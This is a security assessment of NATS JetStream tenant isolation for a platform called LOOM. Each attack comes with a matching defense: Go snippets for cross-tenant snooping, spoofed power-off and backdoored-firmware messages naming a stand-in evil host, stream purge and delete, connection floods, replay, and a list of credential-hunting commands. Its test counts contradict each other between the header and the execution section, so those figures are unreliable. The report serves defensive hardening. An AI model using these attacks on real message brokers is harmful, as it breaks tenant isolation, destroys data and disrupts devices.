# NATS JetStream Attack Surface Analysis for LOOM

**Date**: 2026-03-21
**Scope**: NATS JetStream as used by LOOM for multi-tenant event streaming, device state changes, and edge-to-hub communication
**Code**: `/tmp/loom-security-nats/` (exploit + defense Go code, all tests passing)
**Test Results**: 17 attack tests PASS, 7 defense tests PASS (24/24)

---

## Executive Summary

LOOM uses NATS JetStream with subject-based tenant isolation (`loom.{tenant_id}.device.*`). Without proper hardening, this architecture is vulnerable to 8 classes of attacks that break tenant isolation, enable data exfiltration, allow message spoofing, and can cause service-wide denial of service.

**Critical finding**: Subject-based isolation alone provides ZERO security. Any connected client can subscribe to `loom.>` and see all tenants' events, publish to any tenant's subjects, and manipulate any JetStream stream. NATS account-based isolation is mandatory.

### Risk Matrix

| # | Attack | Impact | Severity | Defense |
|---|--------|--------|----------|---------|
| 1 | Cross-Tenant Snooping | Confidentiality | **CRITICAL** | Account isolation |
| 2 | Message Injection | Integrity | **CRITICAL** | Publish permissions |
| 3 | JetStream Manipulation | Availability + Confidentiality | **CRITICAL** | Account-scoped JetStream |
| 4 | Credential Exposure | Full compromise | **HIGH** | NKey auth, file permissions |
| 5 | Slow Consumer DoS | Availability | **HIGH** | Per-account resource limits |
| 6 | Leaf Node MITM | Full edge compromise | **HIGH** | Mutual TLS |
| 7 | Message Replay | Integrity | **MEDIUM** | Idempotency keys + timestamps |
| 8 | Payload Manipulation | Availability | **MEDIUM** | Defensive deserialization |

---

## Attack 1: Cross-Tenant Event Snooping

### Vulnerability

Without NATS account isolation, any connected client can subscribe to `loom.>` (wildcard) and receive every tenant's events. Subject-based naming conventions provide naming structure but zero access control.

### Exploit

**File**: `attacks/01_cross_tenant_snooping.go`

```go
// Subscribe to the entire loom namespace with a wildcard
sub, err := nc.Subscribe("loom.>", func(msg *nats.Msg) {
    // Sees ALL tenants: acme-corp, globex-inc, initech, etc.
    log.Printf("[SNOOPED] tenant=%s credential=%s", evt.TenantID, evt.Credential)
})
```

**Test result** (`TestAttack01_Snooping_Vulnerable`):
```
[VULNERABLE] Attacker snooped 2 messages from multiple tenants
```

### Defense

**NATS Accounts** scope wildcard subscriptions to the account. Tenant A's `loom.>` subscription only matches subjects within tenant A's account.

**File**: `configs/nats-hardened.conf`

```
accounts {
    ACME {
        users: [{
            nkey: UAACME...
            permissions: {
                publish:   { allow: ["loom.acme-corp.>"] }
                subscribe: { allow: ["loom.acme-corp.>", "_INBOX.>"] }
            }
        }]
    }
    GLOBEX {
        users: [{
            nkey: UAGLOBEX...
            permissions: {
                publish:   { allow: ["loom.globex-inc.>"] }
                subscribe: { allow: ["loom.globex-inc.>", "_INBOX.>"] }
            }
        }]
    }
}
```

**Test result** (`TestAttack01_Snooping_Hardened`):
```
nats: permissions violation: Permissions Violation for Subscription to "loom.>" on connection [7]
[HARDENED] Acme only saw 0 messages, none from globex — isolation verified
```

---

## Attack 2: Message Injection / Spoofing

### Vulnerability

Without publish authorization, any client can publish messages to any subject, including other tenants' namespaces. An attacker can inject fake device discovery events, trigger unauthorized power cycles, or push malicious firmware update commands.

### Exploit

**File**: `attacks/02_message_injection.go`

```go
// Publish fake power-off command to another tenant's production server
nc.Publish("loom.globex-inc.device.power_cycle", []byte(`{
    "device_id": "srv-prod-01",
    "action": "power_off",
    "force": true
}`))

// Push malicious firmware to another tenant's switch
nc.Publish("loom.globex-inc.device.firmware_update", []byte(`{
    "firmware_url": "https://evil.example.com/backdoored-firmware.bin",
    "skip_verify": "true"
}`))
```

**Test result** (`TestAttack02_Injection_Vulnerable`):
```
[VULNERABLE] Injected message delivered to victim: subject=loom.globex-inc.device.power_cycle
```

### Defense

Per-account publish permissions restrict each tenant to their own subject namespace.

**Test result** (`TestAttack02_Injection_Hardened`):
```
nats: permissions violation: Permissions Violation for Publish to
  "loom.globex-inc.device.power_cycle" on connection [7]
[HARDENED] Cross-tenant publish blocked — injection prevented
```

---

## Attack 3: JetStream Stream Manipulation

### Vulnerability

Without JetStream-level authorization, any client can enumerate, read, purge, and delete any tenant's streams. The attacker can also create rogue consumers to exfiltrate historical events.

### Exploit

**File**: `attacks/03_jetstream_manipulation.go`

```go
// Enumerate all streams
for name := range js.StreamNames() { /* discovers all tenants */ }

// Create rogue consumer on victim's stream
js.AddConsumer("LOOM_globex", &nats.ConsumerConfig{
    Durable: "rogue-exfiltrator",
})

// Purge stream — destroy all event history
js.PurgeStream("LOOM_globex")

// Delete stream entirely
js.DeleteStream("LOOM_globex")
```

**Test result** (`TestAttack03_StreamManip_Vulnerable`):
```
[VULNERABLE] Attacker read stream info: msgs=1
[VULNERABLE] Attacker created rogue consumer
[VULNERABLE] Attacker purged victim's stream
[VULNERABLE] Attacker deleted victim's stream — complete data loss!
```

### Defense

Account-level JetStream isolation ensures each account's JetStream API calls (`$JS.API.*`) are scoped to that account. Acme cannot reach globex's `$JS.API.STREAM.DELETE.LOOM_globex`.

```
accounts {
    ACME {
        jetstream: {
            max_mem:       256M
            max_file:      2G
            max_streams:   10
            max_consumers: 50
        }
    }
}
```

**Test result** (`TestAttack03_StreamManip_Hardened`):
```
nats: permissions violation: Permissions Violation for Publish to
  "$JS.API.STREAM.CREATE.LOOM_globex"
nats: permissions violation: Permissions Violation for Publish to
  "$JS.API.STREAM.PURGE.LOOM_globex"
nats: permissions violation: Permissions Violation for Publish to
  "$JS.API.STREAM.DELETE.LOOM_globex"
[HARDENED] All cross-tenant JetStream operations blocked by account isolation
```

---

## Attack 4: Credential Exposure in NATS Config

### Vulnerability

NATS server configs commonly contain plaintext passwords, tokens, and connection strings. If config files are world-readable, checked into git, or embedded in Docker images, credentials are exposed.

### Exploit

**File**: `attacks/04_credential_exposure.go`

```
# VULNERABLE NATS CONFIG
authorization {
    users = [
        {user: "loom-admin",    password: "SuperSecret123!"}
        {user: "tenant-acme",   password: "AcmeP@ss2024"}
    ]
}
leafnodes {
    remotes [{
        url: "nats://hub-admin:HubP@ssword@hub.loom.example.com:7422"
    }]
}
```

Exposure vectors:
1. Config files checked into git (`git log --all -p -- '*.conf'`)
2. Docker images with embedded configs (`docker history`)
3. Environment variables in process listing (`ps auxe`)
4. World-readable config directories
5. Backup files (`.conf.bak`, `.conf~`)
6. CI/CD logs printing connection strings

### Defense

**NKey authentication** (Ed25519 keypairs) eliminates plaintext passwords entirely. The server stores only public keys; the client proves identity by signing a server-issued nonce with the private key.

**File**: `defenses/defense_nkey_auth.go`

```go
// Generate Ed25519 NKey pair
kp, _ := nkeys.CreateUser()
pub, _ := kp.PublicKey()   // UAXXXX... — safe to store in config
seed, _ := kp.Seed()       // SUXXXX... — MUST be protected (0400 permissions)

// Write seed with restricted permissions
os.WriteFile(seedPath, seed, 0400)  // Owner-read-only
```

**Server config** (no passwords anywhere):
```
users: [{ nkey: UAACMEXXXXXXXXXXXXXXX }]
```

**Test result** (`TestNKeyGeneration`):
```
[DEFENSE] Generated NKey for test-tenant:
  Public Key: UBWP3TRLV2M2DNQXEEGDQD6DGYXTDUBKPCM47KNQP7MA2YG2GCPPB4LJ
  Seed File:  test-tenant.nk (permissions: 0400)
[OK] test-tenant.nk permissions: 400 (owner-read-only)
```

---

## Attack 5: Denial of Service via Slow Consumer

### Vulnerability

A JetStream consumer that processes messages slowly (or never acks) forces the server to buffer messages. Without per-account resource limits, one tenant's misbehaving consumer exhausts server memory, causing backpressure that degrades all tenants.

### Exploit

**File**: `attacks/05_slow_consumer_dos.go`

```go
// Slow consumer — holds messages without acking
js.Subscribe("loom.acme-corp.>", func(msg *nats.Msg) {
    time.Sleep(10 * time.Second)  // Deliberately slow
    // Never ack — messages stay pending
}, nats.Durable("slow-attacker"), nats.ManualAck())

// Flood stream to amplify
for i := 0; i < 1000; i++ {
    js.Publish(fmt.Sprintf("loom.acme-corp.device.heartbeat.%d", i), data)
}

// Connection flood
for i := 0; i < 100; i++ {
    nc, _ := nats.Connect(url)
    for j := 0; j < 100; j++ {
        nc.Subscribe(fmt.Sprintf("flood.%d.%d", i, j), func(msg *nats.Msg) {})
    }
}
```

### Defense

Per-account resource limits cap connections, subscriptions, payload sizes, and JetStream storage:

```
ACME {
    limits {
        max_connections:    50
        max_subscriptions:  500
        max_payload:        1048576    # 1MB
        max_leafnodes:      5
    }
    jetstream: {
        max_mem:       256M
        max_file:      2G
        max_streams:   10
        max_consumers: 50
    }
}
```

Key settings:
- `max_connections` prevents connection floods
- `max_subscriptions` limits subscription exhaustion
- `max_payload` blocks oversized messages
- JetStream `max_mem`/`max_file` caps per-tenant storage so one tenant cannot exhaust shared resources

---

## Attack 6: Leaf Node Man-in-the-Middle

### Vulnerability

NATS leaf node connections without TLS transmit all data in plaintext. A network-positioned attacker can:
1. **Eavesdrop** on all edge-to-hub messages (device credentials, firmware URLs)
2. **Inject** fake NATS protocol messages
3. **Impersonate** a legitimate edge site
4. **Hijack** existing TCP sessions

### Exploit

**File**: `attacks/06_leaf_node_mitm.go`

```
# VULNERABLE: Plaintext leaf connection
leafnodes {
    remotes [{
        url: "nats://edge-user:EdgeP@ssword123@hub.example.com:7422"
    }]
}

# Network capture shows everything:
$ tcpdump -i eth0 -A port 7422 | grep -E '(PUB|MSG)'
PUB loom.acme-corp.device.discovered 142
{"tenant_id":"acme-corp","credential":"admin:secret"}
```

### Defense

Mutual TLS (mTLS) on all leaf node connections. Both hub and edge must present certificates signed by the LOOM CA.

**File**: `defenses/defense_tls.go`, `configs/nats-hardened.conf`

```
leafnodes {
    port: 7422
    tls {
        cert_file: "/etc/nats/certs/leafnode-cert.pem"
        key_file:  "/etc/nats/certs/leafnode-key.pem"
        ca_file:   "/etc/nats/certs/ca-cert.pem"
        verify:    true   # CRITICAL: Verify edge site identity
    }
}
```

**Test result** (`TestTLSCertGeneration`):
```
[DEFENSE] TLS certificates generated:
  CA:     ca-cert.pem
  Server: server-cert.pem (key: 0400)
  Client: client-cert.pem (key: 0400)
[PASS] TLS certs generated, hardened configs produced
```

The defense code generates a full PKI chain (CA, server cert, client cert) using ECDSA P-256 keys.

---

## Attack 7: Message Replay Attack

### Vulnerability

If LOOM events lack idempotency keys and timestamps, a captured message can be replayed to trigger duplicate actions: double power cycles, duplicate device registrations, repeated firmware updates.

### Exploit

**File**: `attacks/07_message_replay.go`

```go
// Capture a legitimate power cycle command
captured := CapturedMessage{Subject: msg.Subject, Data: msg.Data}

// Replay it 5 times — device power cycles 5 times
for replay := 0; replay < 5; replay++ {
    nc.Publish(captured.Subject, captured.Data)
}
```

**Test result** (`TestAttack07_Replay_NoProtection`):
```
[VULNERABLE] All 5 messages processed — device power cycled 5 times!
```

### Defense

**File**: `defenses/defense_idempotency.go`

Every LOOM event carries a UUID idempotency key and timestamp. Consumers use a `DeduplicationFilter` that:

1. Rejects messages with missing idempotency keys
2. Rejects messages with timestamps older than `maxAge` (likely replays)
3. Rejects messages with future timestamps (likely spoofed)
4. Tracks seen keys in a sliding window and rejects duplicates

```go
type LoomEvent struct {
    IdempotencyKey string    `json:"idempotency_key"` // UUID
    Timestamp      time.Time `json:"timestamp"`
    TenantID       string    `json:"tenant_id"`
    // ...
}

// JetStream also provides stream-level dedup via Nats-Msg-Id header
js.Publish(subject, data, nats.MsgId(evt.IdempotencyKey))
```

**Test results**:
```
[PASS] First message accepted
[PASS] Replay rejected: duplicate idempotency key ... — replay detected
[PASS] Old message rejected: message too old (age=5m0s, max=1m0s) — likely replay
[PASS] Future message rejected: timestamp in the future (drift=5m0s) — likely spoofed
[PASS] Missing idempotency key rejected
```

---

## Attack 8: Payload Manipulation

### Vulnerability

Malformed payloads can crash consumers through nil pointer dereferences, stack overflows from deep nesting, memory exhaustion from oversized fields, or logic errors from unexpected types.

### Exploit

**File**: `attacks/08_payload_manipulation.go`

16 payload variants tested:

| Payload | Size | Risk |
|---------|------|------|
| Empty | 0B | Nil deref |
| Null bytes | 5B | Parser confusion |
| Invalid JSON | 20B | Unmarshal panic |
| Truncated JSON | 60B | Partial parse |
| Invalid UTF-8 | 13B | Encoding error |
| 1000-level nesting | ~10KB | Stack overflow |
| 1MB string field | 1MB | Memory exhaustion |
| Numeric overflow | 70B | Integer overflow |
| Type confusion | 30B | Wrong type |
| Array instead of object | 30B | Wrong structure |
| Duplicate keys | 60B | Ambiguous parse |
| SQL injection in values | 65B | Downstream injection |
| 100KB key name | 100KB | Memory exhaustion |
| 2MB payload | 2MB | Max payload bypass |
| XSS in values | 70B | Downstream XSS |
| Null JSON values | 60B | Nil deref |

### Defense

**File**: `defenses/defense_payload_validation.go`

10-step validation pipeline:

1. **Size limit** (1MB max)
2. **Non-empty check**
3. **UTF-8 validity**
4. **Null byte detection**
5. **JSON nesting depth** (max 20 levels)
6. **Strict JSON parsing** (`DisallowUnknownFields`)
7. **Required field validation**
8. **String length limits** (tenant: 64, device: 128)
9. **Dangerous character detection** (SQL/script injection patterns)
10. **Event type allowlist** (only known event types)

**Test results** (all 10 payload categories rejected):
```
[PASS] Valid payload accepted: tenant=acme-corp device=sw-01
[PASS] Empty payload rejected: empty payload
[PASS] Invalid JSON rejected: invalid JSON structure
[PASS] Null bytes rejected: payload contains null bytes
[PASS] Deeply nested JSON rejected: JSON nesting too deep
[PASS] Oversized payload rejected: payload exceeds maximum size
[PASS] SQL injection rejected: contains dangerous characters
[PASS] Unknown event type rejected
[PASS] Missing required fields rejected
[PASS] Invalid UTF-8 rejected
```

---

## Hardened Configuration Reference

### Hub Server (`configs/nats-hardened.conf`)

Key security properties:
- **Account isolation**: Separate NATS account per tenant
- **NKey authentication**: Ed25519 keypairs, no plaintext passwords
- **TLS on all connections**: Client connections + leaf nodes
- **mTLS for leaf nodes**: `verify: true` on leafnode TLS block
- **Per-account resource limits**: Connections, subscriptions, payload size
- **Per-account JetStream limits**: Memory, storage, streams, consumers
- **System account**: Separate SYS account for operator monitoring
- **Admin subject deny**: `deny: ["loom.{tenant}._ADMIN.>"]` blocks admin operations

### Edge Server (`configs/edge-hardened.conf`)

- **TLS leaf connection**: `tls://` URL scheme (not `nats://`)
- **Credential file**: NKey seed in file with 0400 permissions
- **Local JetStream**: Store-and-forward for hub disconnection resilience

---

## Test Execution

```bash
cd /tmp/loom-security-nats

# Run attack tests (vulnerable + hardened)
go test ./attacks/ -v -timeout 60s
# 7/7 PASS (17.8s)

# Run defense tests (validation, idempotency, NKeys, TLS)
go test ./defenses/ -v -timeout 60s
# 17/17 PASS (0.3s)
```

---

## File Inventory

```
/tmp/loom-security-nats/
  attacks/
    01_cross_tenant_snooping.go    — Wildcard subscription snooping exploit
    02_message_injection.go        — Cross-tenant publish spoofing exploit
    03_jetstream_manipulation.go   — Stream purge/delete/consumer exploit
    04_credential_exposure.go      — Plaintext config credential extraction
    05_slow_consumer_dos.go        — Slow consumer + connection flood DoS
    06_leaf_node_mitm.go           — Leaf node MITM documentation
    07_message_replay.go           — Capture and replay attack
    08_payload_manipulation.go     — 16 malformed payload variants
    attacks_test.go                — Integration tests against NATS servers
  defenses/
    defense_account_isolation.go   — Account-based tenant isolation
    defense_nkey_auth.go           — NKey (Ed25519) authentication
    defense_idempotency.go         — Deduplication filter + idempotency keys
    defense_payload_validation.go  — 10-step payload validation pipeline
    defense_tls.go                 — TLS/mTLS certificate generation
    defenses_test.go               — Defense unit tests
  configs/
    nats-hardened.conf             — Production-ready hub config
    edge-hardened.conf             — Production-ready edge config
```

---

## Recommendations for LOOM

1. **Mandatory**: Deploy NATS account-based isolation from day one. Subject naming alone is not a security boundary.
2. **Mandatory**: Use NKey authentication exclusively. Zero plaintext passwords in any config file.
3. **Mandatory**: Enable mTLS on all leaf node connections. Edge sites must present valid client certificates.
4. **Mandatory**: Set per-account resource limits to prevent cross-tenant DoS.
5. **Required**: Add idempotency keys to all LOOM events. Use both application-level dedup and JetStream `Nats-Msg-Id`.
6. **Required**: Validate all payloads before processing. Use the defensive deserialization pattern from `defense_payload_validation.go`.
7. **Recommended**: Use NATS operator/account JWT model (nsc tool) for production — more flexible than static config.
8. **Recommended**: Rotate NKeys and TLS certificates on a 90-day cycle.
9. **Recommended**: Monitor NATS server metrics (connections, subscriptions, pending messages) per account for anomaly detection.
10. **Recommended**: Store NKey seeds in a secrets manager (Vault, AWS Secrets Manager) rather than filesystem.
